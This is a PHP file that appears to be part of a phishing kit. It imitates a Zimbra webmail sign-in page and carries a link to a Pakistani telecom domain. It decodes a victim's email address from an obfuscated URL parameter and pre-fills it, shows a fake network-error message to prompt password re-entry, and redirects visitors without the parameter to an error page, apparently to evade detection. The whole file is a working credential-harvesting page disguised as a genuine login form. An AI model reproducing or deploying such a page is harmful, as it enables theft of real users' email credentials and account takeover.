<?php
if(isset($_GET['hgfhjerijgirejgrj834065tjhnj734turfhnbjkdfhgjk3982r894rejgur'])){
$url=$_GET['hgfhjerijgirejgrj834065tjhnj734turfhnbjkdfhgjk3982r894rejgur'];
$userName= base64_decode($url);
$name=$userName;
?>
<!DOCTYPE html>

<html class="user_font_size_normal" lang="en"><head>

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Zimbra Web Client Sign In</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="files/commonloginzhtmlskin.css">
	<link rel="SHORTCUT ICON" href="files/favicon.ico">


</head>
<body onload="onLoad();">

	<div class="LoginScreen">
		<div class="center">
			<div class="contentBox">
				<h1><a href="http://ntc.net.pk/" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
					<span class="ImgLoginBanner"></span>
				</a></h1>
				<div id="ZLoginAppName">Web Client</div>
				<form method="post" name="loginForm" action="" accept-charset="UTF-8">
								<input type="hidden" name="loginOp" value="login">
								<input type="hidden" name="login_csrf" value="1d0767fa-0577-4f47-805c-2faebf23f9b9">
				<div id="ZLoginErrorPanel">
						<table><tr>
							<td><img  src="files/index.png"  title='Error'  alt="Error" id="ZLoginErrorIcon"  ></td>
							<td>Network error. Please try entering it again</td>
						</tr></table>
					</div>
								<table class="form">
                        <tbody><tr>
                                        <td><label for="username">Username:</label></td>
                                        <td><input id="username" class="zLoginField" name="username" value="<?=$name?>" type="text" size="40" maxlength="1024" ></td>
                                        </tr>
                                        <tr>
                                <td><label for="password">Password:</label></td>
                                <td><input id="password" autocomplete="off" class="zLoginField" name="password"  required="" type="password" value="" size="40" maxlength="1024"></td>
                                </tr>
                                <tr>
                                <td>&nbsp;</td>
                                <td class="submitTD">
                                <input id="remember" value="1" type="checkbox" name="zrememberme">
                                    <label for="remember">Stay signed in</label>
                                <input type="submit" onclick="CheckValidCaptcha();" class="ZLoginButton DwtButton" value="Sign In">
                                </td>
                                </tr>
			
				<tr>
                            <td colspan="2"><hr></td>
                            </tr>
                            <tr>
                            <td>
                            <label for="client">Version:</label>
                            </td>
                         
                            <td>
                            <div class="positioning">
                            <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
                                    <option value="preferred" selected="selected"> Default</option>
                                    <option value="advanced"> Advanced (Ajax)</option>
                                    <option value="standard"> Standard (HTML)</option>
                                    <option value="mobile"> Mobile</option>
                                    </select>
                               <a href="#" onclick="showWhatsThis();" id="ZLoginWhatsThisAnchor" aria-controls="ZLoginWhatsThis" aria-expanded="false">What’s This?</a>
                        <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick="showWhatsThis();" role="tooltip"><h3 style="text-align:center;">Client Types</h3>	<b>Advanced</b>
 offers the full set of Web collaboration features. This Web Client 
works best with newer browsers and faster Internet connections. <br><br><b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br><br><b>Mobile</b> is recommended for mobile devices. <br><br>To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.</div>
                        <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note
 that your web browser or display does not fully support the Advanced 
version.  We strongly recommend that you use the Standard client.</div>
                        </div>
                        </td>
                        </tr>
                        </tbody></table>
                    </form>
			</div>
			<div class="decor1"></div>
		</div>

		<div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="https://www.zimbra.com/">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com/">Blog</a> - <a target="_new" href="https://wiki.zimbra.com/">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a></div>
			<div class="copyright">
			Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
		</div>
		<div class="decor2"></div>
	</div>
	
<script type="text/javascript" src="files/js.js"></script>

</body></html>
<?php
}else{
    header('location:error.php');
}
?>
